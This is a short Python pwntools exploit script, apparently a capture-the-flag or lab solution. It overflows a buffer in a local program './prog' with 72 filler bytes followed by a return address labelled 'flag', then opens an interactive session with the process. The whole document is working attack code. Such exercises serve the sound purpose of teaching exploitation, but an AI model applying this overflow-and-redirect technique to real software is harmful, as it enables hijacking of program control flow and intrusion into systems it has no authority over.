#!/usr/bin/python
from pwn import *

offset = 72
flag = 0x401172

def gen_payload():

    return "A" * offset + p64(flag)

if __name__ == '__main__':

    p = process('./prog')
    p.recvuntil(": ")
    p.send(gen_payload())
    p.interactive()
